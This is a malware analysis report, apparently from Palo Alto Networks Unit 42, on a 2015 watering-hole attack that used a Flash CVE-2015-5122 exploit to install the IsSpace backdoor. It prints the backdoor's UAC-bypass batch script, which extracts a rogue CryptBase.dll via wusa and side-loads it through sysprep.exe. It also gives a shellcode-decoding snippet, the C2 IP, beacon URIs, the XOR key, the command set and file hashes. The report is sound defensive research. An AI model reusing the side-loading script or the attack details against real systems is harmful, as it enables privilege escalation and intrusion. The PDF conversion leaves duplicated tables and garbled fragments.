    "plain_text": "# Install IsSpace Backdoor\n\nOn July 16, 2015, the Palo Alto Networks Unit 42 threat intelligence team discovered a watering hole\n\nattack on the website of a well-known aerospace firm. The website was compromised to launch an\n\napparent watering-hole attack against the company’s customers. It was hosting an Adobe Flash exploit\n\ntargeting one of the newly disclosed vulnerabilities from the Hacking Team data breach, CVE-2015-5122.\n\nThis attack yet again showcases the opportunistic tendencies of adversary groups and bad actors. The\n\nmalware deployed by this exploit has been seen in a number of targeted attacks and provides attackers\n\nwith a foothold on the victim’s machine and/or network.\n\n[The exploit file, movie.swf, was ZWS compressed, a tactic that has been observed to evade anti-virus](http://blog.malwaretracker.com/2014/01/cve-2013-5331-evaded-av-by-using.html)\n\nprograms. Once uncompressed, a binary was found to be embedded in the Flash file. Upon further\n\n[analysis, this file was found to contain behavior consistent with a Trojan commonly called IsSpace. Based](https://publicintelligence.net/fbi-hack-tools-opm/)\n\non its codebase and behavioral patterns, it appears that IsSpace could possibly be an evolution of the\n\n[NFlog backdoor, which has previously been attributed to the adversary groups DragonOK and Moafee.](http://researchcenter.paloaltonetworks.com/2015/04/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/)\n\nBoth groups are thought to be operating out of Southeast Asia, and Moafee in particular has been\n\n[associated with attacks on the US defense industrial base.](https://www.fireeye.com/resources/pdfs/white-papers/fireeye-operation-quantum-entanglement.pdf)\n\n## Exploit Details\n\nThe CVE-2015-5122 exploit found within the Flash file is nearly identical to the original proof of concept\n\n[(POC) disclosed publically from the Hacking Team data breach. An analysis by Trend Micro covers the](http://blog.trendmicro.com/trendlabs-security-intelligence/another-zero-day-vulnerability-arises-from-hacking-team-data-leak/)\n\nPOC in detail. Unlike the POC mentioned in the Trend Micro report, this particular exploit file was\n\nweaponized, and, instead of loading calc.exe, a much more malicious file was loaded. As seen in Figure 1,\n\nthe embedded shellcode is obfuscated using the same technique of representing bytes as integers and\n\nexponential numbers. However it appears that the adversary did not modify the POC much, as the variable\n\nname ‘calc’ remains unchanged.\n\n\n-----\n\nFigure 1. Embedded shellcode within the malicious Flash file\n\nThese values can be converted into their byte representations using a simple Python script, truncated here\n\nfor brevity.\n\n\n>>> import struct\n>>> shellcode = [2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585]\n>>> for s in shellcode:\n...   print repr(struct.pack(\"I\", s))\n...\n'U\\x8b\\xec\\x81'\n'\\xec`\\x04\\x00'\n'\\x00S\\x90\\x90'\n'\\x90\\x90\\xc7\\x85'\n'\\xd0\\xfc\\xff\\xff'\n'AAAA'\n\n|Col1|>>> import struct >>> shellcode = [2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585] >>> for s in shellcode: ... print repr(struct.pack(\"I\", s)) ...

This binary data is loaded and decompressed with ZLIB prior to being stored in a newly\n\nallocated section of memory. The address of this binary data is then stored in the shellcode before it is\n\nexecuted.\n\n\n-----\n\nFigure 2. Exploit loading binary and running shellcode\n\nAfter successful execution, a binary with the following attributes is executed on the victim’s machine.\n\nMD5 319500B2C792AEE6CD8EF8EE87D9DC1E\n\nSHA1 723DB4F13E98364098D76B925EA197F9ECD5309B\n\nSHA256 27439ADAA07F5AD16EB8039C16ECEB4E71F6358E7FC13AC645E8878DA8C3E77E\n\nSize 59904 Bytes\n\nFile Type PE32 executable (GUI) Intel 80386, for MS Windows\n\nCompile Timestamp 2014-11-14 04:35:13 UTC\n\n## Malware Details\n\nAs seen by the compile timestamp, this malware sample is not extremely current. The timestamp shows a\n\ncompile date of November 14, 2014, which indicates that the infrastructure used by this particular sample\n\nhas remained intact for quite some time, relatively speaking. Analysis of the malware indicates that this\n\nsample is highly likely to be the Trojan tool IsSpace, which shares similar code and behaviors as the NFlog\n\ntool.\n\nWhen comparing IsSpace to NFlog, we noticed a number of changes have been made. When initially run,\n\nthe malware attempts to write log messages to ‘C:\\ProgramData\\log[.]txt’ indicating that this variant was\n\nintended to run on Microsoft Windows 7 or higher. However, it still maintains the capability to run on\n\noperating systems earlier than Microsoft Windows 7 if needed. IsSpace creates an event named\n\n|MD5|319500B2C792AEE6CD8EF8EE87D9DC1E|\n|---|---|\n|SHA1|723DB4F13E98364098D76B925EA197F9ECD5309B|\n|SHA256|27439ADAA07F5AD16EB8039C16ECEB4E71F6358E7FC13AC645E8878DA8C3E77E|\n|Size|59904 Bytes|\n|File Type|PE32 executable (GUI) Intel 80386, for MS Windows|\n|Compile Timestamp|2014-11-14 04:35:13 UTC|\n\n\n-----\n\ninfected host.\n\nTo determine the flow of execution, IsSpace gathers various data about the infected host, such as\n\nadministrative rights of the user, operating system version, and CPU architecture.\n\nIf IsSpace determines that it is running as an administrator on a Microsoft Windows 7 system on a 32-bit\n\nplatform, it will attempt to execute itself accordingly, using a side-loading technique. The malware will\n\ndrop a cabinet file and batch script to the following locations:\n\n%TEMP%\\FASAP.DAT\n\n%TEMP%\\FASAPI.bat\n\nThe batch script contains the following:\n\n\n@echo off\nping localhost\nstart wusa [%TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\\nping localhost\nping localhost\nping localhost\nping localhost\nping localhost\nstart %windir%\\system32\\sysprep\\sysprep.exe \"[CWD]\\[Malware].EXE\"\n\n|Col1|@echo off ping localhost start wusa [%TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\ ping localhost ping localhost ping localhost ping localhost ping localhost start %windir%\\system32\\sysprep\\sysprep.exe \"[CWD]\\[Malware].EXE\"|\n|---|---|\n\n\n\n[CWD] is the directory where the malware was run from and [%TEMP%] is the full path of the %TEMP%\n\ndirectory.\n\nThe batch script will first extract the cabinet file to the sysprep directory. The extracted file is a 32-bit DLL\n\nwith the name ‘CryptBase.dll.’ The batch script continues to execute sysprep.exe after approximately 5\n\nseconds, which will automatically load the dropped CryptBase.dll file. This DLL will execute the provided\n\nargument in a child process This newly created process has elevated privileges as it is spawned by\n\n\n-----\n\nA similar process is taken for 64-bit systems. However, instead of dropping a batch script, a 64-bit\n\nexecutable along with a cabinet file containing a 64-bit version of CryptBase.dll is dropped to the following\n\npath instead:\n\n%TEMP%\\FASAPI.bin\n\n%TEMP%\\FASAP.DAT\n\nThis executable is then run in a new process. It is responsible for unpacking the cabinet file and spawning\n\na new instance of sysprep.exe.\n\nIf the malware detects that it is running on a Windows XP host, it will attempt to check for Internet\n\n[connectivity by making a HTTP request to www.microsoft.com. This is similar to characteristics observed](http://www.microsoft.com/)\n\nin the NFlog backdoor, with the primary deviation being that this activity only takes place when running\n\nin a Windows XP environment with IsSpace.\n\nIsSpace proceeds to make HTTP requests to 172.246.109.27, which appears to be its primary command\n\nand control (C2) server. The initial HTTP request is made to ‘//STTip.asp.’ Note the extra leading forward\n\nslash. This is likely an unfortunate side effect of the malware expecting a subdirectory in the URI path. As\n\nthis particular sample did not supply one, the extra slash is seen. An example request made can be seen\n\nbelow:\n\nFigure 3. Initial IsSpace beacon being sent\n\nAfter the initial beacon, IsSpace will exfiltrate victim information by making an HTTP request to\n\n‘//SNews.asp?HostID=xx-xx-xx-xx-xx-xx’, where the HostID contains the victim’s MAC address. The\n\nPOST data sent in this request is encrypted using the same four-byte XOR key of ‘\\x35\\x8E\\x9D\\x7A’ that\n\nhas been used by the NFlog tool.\n\n\n-----\n\nFigure 4. IsSpace disseminating victim information and accepting command\n\nThe decrypted information contains data similar to the following:\n\n\n'60-F8-1D-CC-2F-CF#%##%#172.16.95.137#%#WINLJLV2NKIOKP#%#Win7#%#English(US)#%#2015-07-17\n09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'\n\n|Col1|'60-F8-1D-CC-2F-CF#%##%#172.16.95.137#%#WIN-LJLV2NKIOKP#%#Win7#%#English(US)#%#2015- 07-17 09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'|\n|---|---|\n\n\nOnce again, the exfiltrated data is very similar to what has been used by NFlog; however with IsSpace, the\n\nvictim’s user privilege level is also included, in addition to a variable of either ‘IsSpace’ or ‘IsGoogle.’ This\n\nparticular variable is still under investigation by Unit 42. Additionally, we see what is likely a campaign\n\ncode of ‘303_20140401’.\n\nAfter the successful check-in and initial exfiltration, IsSpace will then accept the following commands:\n\nCommand Description Response URI\n\nCMD Executes command //STravel.asp\n\nBrowse List specified directory //SJobs.asp\n\nUploadFile Upload file //SSports.asp\n\nDownLoad Download file //SWeather.asp\n\nDelFile Delete file N/A\n\nIsSpace provides attackers with a foothold into the victim’s machine and/or network. While the malware\n\nitself provides limited functionality, it allows attackers to perform minimal reconnaissance and deploy\n\nfurther malware onto the device.\n\n## Infrastructure\n\n|Command|Description|Response URI|\n|---|---|---|\n|CMD|Executes command|//STravel.asp|\n|Browse|List specified directory|//SJobs.asp|\n|UploadFile|Upload file|//SSports.asp|\n|DownLoad|Download file|//SWeather.asp|\n|DelFile|Delete file|N/A|\n\n\n-----\n\nFigure 5. Infrastructure related to the command and control IP address\n\nThe IP 172.246.109.27 is hardcoded in the IsSpace sample and is likely to be the primary C2 server.\n\nPivoting off of this primary C2 IP address using passive DNS data, we located seven domain names and\n\ntwo additional IP addresses that may be related to this attack. Three of the domains found used the prefix\n\n‘ssl’ or ‘dns’ as the third level domain; this tactic is commonly used by malware authors as an evasion\n\nmethod.\n\nExamining the WHOIS data for the domains revealed additional intelligence on possible attribution.\n\nSpecifically, the WHOIS data showed the start-vedioing[.]net to be allegedly registered to an entity in\n\nJapan:\n\nRegistry Registrant ID:\n\nRegistrant Name: Alta Rohde\n\nRegistrant Organization:\n\nRegistrant Street: tokoy\n\nRegistrant Street: tokoy\n\nRegistrant City: tokoy\n\nRegistrant State/Province: Aomori\n\nRegistrant Postal Code: 236521\n\nRegistrant Country: Japan\n\nRegistrant Phone: +81.21244215\n\nRegistrant Phone Ext:\n\nRegistrant Fax:\n\nRegistrant Fax Ext:\n\nRegistrant Email: alta.rohde@inbox[.]com\n\nAnd the anywhere-staring[.]com was found to be allegedly registered to an entity in China:\n\nRegistry Registrant ID:\n\nRegistrant Name: lan fei\n\nRegistrant Organization:\n\n\n-----\n\nRegistrant City: bei da\n\nRegistrant State/Province: qing nao\n\nRegistrant Postal Code: 888000\n\nRegistrant Country: China\n\nRegistrant Phone: +86.13877554411\n\nRegistrant Phone Ext:\n\nRegistrant Fax:\n\nRegistrant Fax Ext:\n\nRegistrant Email: csolyc110@163[.]com\n\nThe geographic regions indicated in the WHOIS data are consistent with campaigns previously associated\n\nwith NFlog, showing that the adversaries attributed to this malware were highly likely to be operating out\n\nof Southeast Asia. IsSpace is a newer variant of the NFlog malware family, and contains many similarities\n\nin its behavior and code base. It is highly likely that adversary groups that have historically used NFlog are\n\nnow using IsSpace.\n\n## Conclusion\n\nAdversaries continue to exploit easily accessible vulnerabilities and readily re-use exploit code and\n\npayloads, largely due to their efficacy. This type of behavior and activity is expected to continue for the\n\nnear future due to the multiple vulnerabilities disclosed by the Hacking Team data breach.\n\nAs with many other previously disclosed advanced attacks, relying purely on a detection-based model for\n\nsecurity is ineffective when IOCs are either unknown or are not readily available for ingestion. Thus, it is\n\nimperative that organizations deploy automated, behavior-based preventative measures such as Palo Alto\n\n[Networks WildFire or Traps to reduce the risk of unknown attacks.](http://researchcenter.paloaltonetworks.com/2015/07/palo-alto-networks-traps-protects-from-latest-flash-zero-day-vulnerability-cve-2015-5119/)\n\nPalo Alto Networks customers using WildFire are protected from this campaign. Additionally, IPS\n\n[signature 14365 detects IsSpace command and control traffic inside a network.](https://threatvault.paloaltonetworks.com/Home/ThreatDetail/14365)\n\n## File Information\n\nName Rdws.exe\n\nMD5 319500B2C792AEE6CD8EF8EE87D9DC1E\n\nSHA1 723DB4F13E98364098D76B925EA197F9ECD5309B\n\nSHA256 27439ADAA07F5AD16EB8039C16ECEB4E71F6358E7FC13AC645E8878DA8C3E77E\n\nSize 59904 Bytes\n\nFile Type PE32 executable (GUI) Intel 80386, for MS Windows\n\nC il Ti t UTC\n\n|Name|Rdws.exe|\n|---|---|\n|MD5|319500B2C792AEE6CD8EF8EE87D9DC1E|\n|SHA1|723DB4F13E98364098D76B925EA197F9ECD5309B|\n|SHA256|27439ADAA07F5AD16EB8039C16ECEB4E71F6358E7FC13AC645E8878DA8C3E77E|\n|Size|59904 Bytes|\n|File Type|PE32 executable (GUI) Intel 80386, for MS Windows|\n\n\n-----\n\n|Name|Col2|FASAPI.bin|\n|---|---|---|\n|MD5||10DBFB65836773567B466918250D7EF4|\n|SHA1||4330F5AD25980E0EBB0165F6B49727152735EF4A|\n|SHA256||25BA7D0399DDA177A2F35F2F5804BA54A272E43C192649339E5CBF8BD4EFA0E0|\n|Size||9216 Bytes|\n|File Type||PE32+ executable (console) x86-64, for MS Windows|\n|Compile Timestamp||2014-05-06 13:23:38 UTC|\n|Name||FASAP.DAT (64-bit)|\n|MD5||7F1779F37F257006576B2D41919441EC|\n|SHA1||4AC396084E932733BB887B51FA5A5E489D9CB0EC|\n|SHA256||53EDFF51E0E52B2D1E8526FEA144E9EA923183C2CFECE8A87DDA92B8390651AF|\n|Size||4065 Bytes|\n|File Type||Microsoft Cabinet archive data, 4065 bytes, 1 file|\n|Name||CryptBase.dll (64-bit)|\n|MD5||1F132F365E60CD43FFF75CD3CA464463|\n|SHA1||4DF97974B36ADADFDFDA44172484019AD2EDD649|\n|SHA256||BDBD4974F872A6B62528F4F03C64D6CD9CF5E9352582F5AE242DC7F843A6FE55|\n|Size||9216 Bytes|\n|File Type||PE32+ executable (DLL) (GUI) x86-64, for MS Windows|\n|Compile Timestamp||2014-04-21 13:08:07 UTC|\n|Name|FASAP.DAT||\n|MD5|D0D267D8CBBB7DBC59CFC68742FD0559||\n|SHA1|4586685CC724DEDFFB9C41F65B2DFFC7017F2970||\n|SHA256|05ACABAC8BCA04AC36FBD8B7DFBE21BDE720EBE82A6B642721114E7FBDA01BEA||\n|Size|3870 Bytes||\n|File Type|Microsoft Cabinet archive data, 3870 bytes, 1 file||\n|Name||CryptBase.dll (64-bit)|\n|MD5||BCDEC2A79EADF1DA2166BBB705A25AAE|\n|SHA1||FD2CE90293CBB7CD28B42CE8FFB2CE5D95ED3260|\n|SHA256||052AAD8133E1FFC2863581DB33D366BA4180DFCF2E01ED7ACBEA4D53C355AB59|\n|Size||7680 Bytes|\n|File Type||PE32 executable (DLL) (GUI) Intel 80386, for MS Windows|\n|Compile Timestamp||2014-04-20 12:19:57 UTC|\n\n\n-----",
